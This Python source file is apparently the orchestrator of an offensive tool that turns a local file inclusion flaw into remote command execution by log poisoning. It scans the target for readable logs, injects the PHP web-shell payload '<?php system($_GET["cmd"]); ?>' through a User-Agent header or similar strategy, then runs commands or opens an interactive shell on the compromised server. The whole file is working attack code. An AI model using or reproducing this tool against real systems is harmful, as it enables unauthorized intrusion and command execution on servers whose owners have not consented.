"""
Main application orchestrator.
Follows Dependency Inversion Principle and Single Responsibility Principle.
"""

from typing import Optional

from config import Config
from http_client import HttpClient
from log_scanner import LogScanner, VulnerableLog
from poisoning_strategies import PoisoningStrategyFactory
from command_executor import CommandExecutor
from ui import UserInterface


class LogPoisoningApp:
    """Main application orchestrator."""
    
    def __init__(self, target_url: str, param: str = "language"):
        """
        Initialize application.
        
        Args:
            target_url: Target URL with LFI vulnerability
            param: Vulnerable parameter name
        """
        self.target_url = target_url
        self.param = param
        self.config = Config()
        self.http_client = HttpClient(timeout=self.config.request_timeout)
        self.scanner = LogScanner(self.http_client, target_url, param, self.config)
        self.ui = UserInterface()
    
    def _find_log_info(self, log_path: str) -> VulnerableLog:
        """
        Find or create log information for a given path.
        
        Args:
            log_path: Path to the log file
            
        Returns:
            VulnerableLog instance
        """
        # Check if it's a known log type
        for log_type, log_info in self.config.log_locations.items():
            if log_path in log_info.paths:
                return VulnerableLog(
                    path=log_path,
                    log_type=log_type,
                    method=log_info.method,
                    description=log_info.description,
                    content_preview=""
                )
        
        # Unknown log type, use default method
        print("[!] Unknown log type, defaulting to User-Agent poisoning")
        return VulnerableLog(
            path=log_path,
            log_type='custom',
            method='user_agent',
            description='Custom log',
            content_preview=""
        )
    
    def _setup_executor(self, log: VulnerableLog) -> Optional[CommandExecutor]:
        """
        Set up command executor for a given log.
        
        Args:
            log: Vulnerable log to exploit
            
        Returns:
            CommandExecutor or None on failure
        """
        try:
            strategy = PoisoningStrategyFactory.create(
                log.method,
                self.http_client,
                self.config.default_user_agent
            )
        except ValueError as e:
            print(f"[-] {e}")
            return None
        
        executor = CommandExecutor(
            self.http_client,
            strategy,
            self.target_url,
            self.param,
            log.path,
            self.config
        )
        
        # Test poisoning
        print(f"\n[*] Testing log poisoning...")
        if not strategy.poison(
            self.target_url,
            self.param,
            log.path,
            '<?php system($_GET["cmd"]); ?>'
        ):
            print("[-] Failed to poison log")
            return None
        
        print("[+] Log poisoned successfully")
        return executor
    
    def run(self, command: Optional[str] = None, log_path: Optional[str] = None) -> bool:
        """
        Run the application.
        
        Args:
            command: Optional single command to execute
            log_path: Optional specific log path to use
            
        Returns:
            True if successful, False otherwise
        """
        self.ui.display_header(self.target_url, self.param)
        
        # Determine which log to exploit
        if log_path:
            # Use provided log path
            print(f"\n[*] Using provided log: {log_path}")
            
            readable, _ = self.scanner.test_log_readability(log_path)
            if not readable:
                print("[-] Provided log is not readable")
                return False
            
            print("[+] Log is readable")
            selected_log = self._find_log_info(log_path)
        else:
            # Scan for vulnerable logs
            vulnerable_logs = self.scanner.scan_all_logs()
            
            if not vulnerable_logs:
                print("\n[-] No readable logs found")
                return False
            
            # Let user select log
            selected_log = self.ui.select_log(vulnerable_logs)
            if not selected_log:
                return False
        
        # Set up executor
        executor = self._setup_executor(selected_log)
        if not executor:
            return False
        
        # Execute command or start interactive shell
        if command:
            self.ui.run_single_command(executor, command)
        else:
            self.ui.run_interactive_shell(executor, selected_log.path, selected_log.method)
        
        return True
    
    def cleanup(self):
        """Clean up resources."""
        self.http_client.close()
